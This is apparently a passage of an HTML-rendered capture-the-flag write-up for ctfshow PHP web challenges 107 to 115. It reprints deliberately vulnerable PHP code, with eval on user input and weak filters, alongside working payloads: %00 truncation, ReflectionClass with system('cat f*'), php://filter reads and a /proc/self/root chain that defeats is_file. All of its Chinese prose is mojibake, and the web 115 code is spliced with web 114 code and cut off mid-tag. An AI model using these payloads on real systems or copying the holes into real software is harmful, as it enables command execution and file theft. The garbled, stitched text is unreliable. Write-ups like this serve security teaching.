class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è®²è§£ä¸€ä¸‹parse_str(<span class="variable">$string</span>,<span class="variable">$array</span>):å°†<span class="keyword">string</span>æ·»åŠ åˆ°<span class="keyword">array</span>ä¸­.</span><br><span class="line">      è‹¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸º hack=k1he,ç¬¬äºŒä¸ªå‚æ•°ä¸ºhacker.é‚£ä¹ˆå°±ä¼šå­˜åœ¨hacker[hack]=k1he</span><br><span class="line">æœ¬é¢˜æ–¹æ³•æŒºå¤šçš„.md5å°±ä¸€ä¸ªæ— æ³•å¤„ç†æ•°ç»„</span><br><span class="line">v2æ— flagå‚æ•°å³å¯.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-108-eregæ­£åˆ™æˆªæ–­ï¼Œstrrevåè½¬å­—ç¬¦ä¸²"><a href="#web-108-eregæ­£åˆ™æˆªæ–­ï¼Œstrrevåè½¬å­—ç¬¦ä¸²" class="headerlink" title="web 108:eregæ­£åˆ™æˆªæ–­ï¼Œstrrevåè½¬å­—ç¬¦ä¸²"></a>web 108:eregæ­£åˆ™æˆªæ–­ï¼Œstrrevåè½¬å­—ç¬¦ä¸²</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">strrev:åè½¬å­—ç¬¦ä¸²</span><br><span class="line">%<span class="number">00</span>:æ­£åˆ™æˆªæ–­</span><br><span class="line">æ ¹æ®é¢˜ç›®å¿…é¡»æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯å­—æ¯.</span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬é‡‡ç”¨æ­£åˆ™æˆªæ–­:ä»…eregå­˜åœ¨</span><br><span class="line">å¹¶ä¸”æ˜¯å¼±æ¯”è¾ƒ</span><br><span class="line">payload:a%<span class="number">00778</span> åè½¬ä¹‹å:<span class="number">877</span>%<span class="number">00</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-109-åå°„ç±»RCE"><a href="#web-109-åå°„ç±»RCE" class="headerlink" title="web 109:åå°„ç±»RCE"></a>web 109:åå°„ç±»RCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿™ä¸ªä¸€çœ‹å¥½åƒæ˜¯åå°„ç±»,åŸç”Ÿç±»çš„è€ƒå¯Ÿ.å› ä¸º<span class="variable">$v1</span>&amp;v2å¯æ§.æˆ‘ä»¬å¯ä»¥ä»»æ„æ„é€ ç±»;</span><br><span class="line">å†çœ‹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼:åŒ¹é…æœ‰<span class="number">1</span>ä¸ªå­—æ¯ä»¥ä¸Šçš„å­—ç¬¦ä¸²</span><br><span class="line">é‚£ä¹ˆæ„é€ ä¸€ä¸ªåå°„ç±»,ç„¶åæ‰§è¡Œå‘½ä»¤å³å¯.</span><br><span class="line"><span class="comment">//payload:?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span></span><br><span class="line"><span class="comment">//payload:?v1=ReflectionClass&amp;v2=system(&quot;cat f*&quot;)</span></span><br><span class="line">è¿™é‡Œä¸åŠ <span class="string">&quot;;&quot;</span> å› ä¸ºé¢˜ç›®ä¸Šå­˜åœ¨åˆ†å·é—­åˆäº†.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-110-åŸç”Ÿç±»ï¼šFilesystemIterator"><a href="#web-110-åŸç”Ÿç±»ï¼šFilesystemIterator" class="headerlink" title="web 110:åŸç”Ÿç±»ï¼šFilesystemIterator"></a>web 110:åŸç”Ÿç±»ï¼šFilesystemIterator</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\# |\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\# |\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">æœ¬é¢˜è€ƒå¯ŸåŸç”Ÿç±»:<span class="built_in">FilesystemIterator</span></span><br><span class="line">è¯¥ç±»ç”¨äºæŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶å</span><br><span class="line">å‚æ•°åªè¦æœ‰ä¸€ä¸ªâ€œ.â€å°±å¯ä»¥æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨getcwdæ¥è·å–å½“å‰ç›®å½•ã€‚</span><br><span class="line"><span class="comment">//payload:?v1=FilesystemIterator&amp;v2=getcwd</span></span><br><span class="line">è·å¾—ä¸€ä¸ªæ–‡ä»¶flag36dga.txt</span><br><span class="line">è®¿é—®è¯¥æ–‡ä»¶å³å¯æ‹¿åˆ°flagã€‚</span><br><span class="line">é¡ºä¾¿è´´å‡ºè¿™ä¸ªç±»çš„è¿›ä¸€æ­¥ç”¨æ³•</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-111ï¼šå…¨å±€å˜é‡-var-dump"><a href="#web-111ï¼šå…¨å±€å˜é‡-var-dump" class="headerlink" title="web 111ï¼šå…¨å±€å˜é‡,var_dump"></a>web 111ï¼šå…¨å±€å˜é‡,var_dump</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\# |\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\# |\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å¾ˆæ˜æ˜¾<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>)äº†</span><br><span class="line">é‚£ä¹ˆä¸€å®šå­˜åœ¨<span class="variable">$flag</span>äº†ã€‚</span><br><span class="line">å› ä¸º&amp;çš„å­˜åœ¨åŠ¨æ€è·Ÿè¸ªã€‚</span><br><span class="line">å› ä¸ºvar_dumpçš„å­˜åœ¨ã€‚</span><br><span class="line">è€Œvar_dump(<span class="variable">$GLOBALS</span>)ä¼šåˆ—å‡ºæ‰€æœ‰å…¨å±€å˜é‡ã€‚</span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ‰“å°æ‰€æœ‰å…¨å±€å˜é‡</span><br><span class="line"><span class="comment">//payload:?v1=ctfshow&amp;v2=GLOBALS</span></span><br><span class="line">è¿›å…¥å‡½æ•°å:</span><br><span class="line"><span class="variable">$ctfshow</span> = &amp;<span class="variable">$GLOBALS</span></span><br><span class="line">var_dump(<span class="variable">$ctfshow</span>) === var_dump(<span class="variable">$GLOBALS</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-112-is-fileç»•è¿‡"><a href="#web-112-is-fileç»•è¿‡" class="headerlink" title="web 112:is_fileç»•è¿‡"></a>web 112:is_fileç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">is_file:æ£€æµ‹æ–‡ä»¶åæ˜¯å¦ä¸ºæ­£å¸¸æ–‡ä»¶åã€‚æ˜¯åˆ™è¿”å›<span class="literal">true</span></span><br><span class="line">å¦‚æœæˆ‘ä»¬è¾“å…¥flag.phpä¼šè¢«è¯†åˆ«ä¸ºæ­£å¸¸æ–‡ä»¶åã€‚åˆ™ç»•ä¸è¿‡ã€‚</span><br><span class="line">å†æ ¹æ®é¢˜ç›®é»‘åå•ï¼Œè€ƒè™‘åˆ°ä½¿ç”¨ä¼ªåè®®ï¼Œè€Œphp:<span class="comment">//filteræœªè¿‡æ»¤ã€‚</span></span><br><span class="line">payload:?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">äº‹åæ‰çŸ¥é“phpä¼ªåè®®å¯ä»¥ç»•è¿‡is_fileæ£€æµ‹</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-113-is-fileåˆ¤æ–­æº¢å‡º"><a href="#web-113-is-fileåˆ¤æ–­æº¢å‡º" class="headerlink" title="web 113:is_fileåˆ¤æ–­æº¢å‡º"></a>web 113:is_fileåˆ¤æ–­æº¢å‡º</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">is_file:æ£€æµ‹æ–‡ä»¶åæ˜¯å¦ä¸ºæ­£å¸¸æ–‡ä»¶åã€‚æ˜¯åˆ™è¿”å›<span class="literal">true</span></span><br><span class="line">å¦‚æœæˆ‘ä»¬è¾“å…¥flag.phpä¼šè¢«è¯†åˆ«ä¸ºæ­£å¸¸æ–‡ä»¶åã€‚åˆ™ç»•ä¸è¿‡ã€‚</span><br><span class="line">è¿™é¢˜çœ‹äº†WPæ‰ä¼šã€‚</span><br><span class="line">åˆ©ç”¨is_fileçš„åˆ¤æ–­æº¢å‡ºã€‚è¾“å…¥è¶³å¤Ÿé•¿çš„é‡å¤ä½¿is_fileå¤±æ•ˆ</span><br><span class="line">/proc/<span class="built_in">self</span>/root ä»£è¡¨æ ¹ç›®å½•ã€‚</span><br><span class="line">å¸ˆå‚…çš„wpä¸Šè¯´è‡³å°‘éœ€è¦<span class="number">21</span>ä¸ª/proc/<span class="built_in">self</span>/rootæ‰èƒ½æº¢å‡º</span><br><span class="line"><span class="comment">//payload:/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-114"><a href="#web-114" class="headerlink" title="web 114:"></a>web 114:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">is_file:æ£€æµ‹æ–‡ä»¶åæ˜¯å¦ä¸ºæ­£å¸¸æ–‡ä»¶åã€‚æ˜¯åˆ™è¿”å›<span class="literal">true</span></span><br><span class="line">å¦‚æœæˆ‘ä»¬è¾“å…¥flag.phpä¼šè¢«è¯†åˆ«ä¸ºæ­£å¸¸æ–‡ä»¶åã€‚åˆ™ç»•ä¸è¿‡ã€‚</span><br><span class="line">è¿™é¢˜å‘ç°filteræ²¡è¢«è¿‡æ»¤ã€‚ä¹±æ€</span><br><span class="line"><span class="comment">//payload:?file= php://filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-115-is-numericï¼Œtrimç»•è¿‡"><a href="#web-115-is-numericï¼Œtrimç»•è¿‡" class="headerlink" title="web 115:is_numericï¼Œtrimç»•è¿‡"></a>web 115:is_numericï¼Œtrimç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span 